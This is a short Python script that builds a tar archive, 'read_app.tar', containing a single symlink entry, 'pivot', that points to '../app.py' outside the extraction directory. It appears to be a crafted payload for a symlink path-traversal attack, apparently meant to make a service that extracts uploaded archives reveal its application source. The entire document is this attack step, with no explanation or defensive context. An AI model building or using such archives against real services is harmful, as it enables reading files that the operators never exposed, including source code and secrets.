import tarfile

with tarfile.open("read_app.tar", mode="w") as tar:
    link = tarfile.TarInfo("pivot")
    link.type = tarfile.SYMTYPE
    link.linkname = "../app.py"
    tar.addfile(link)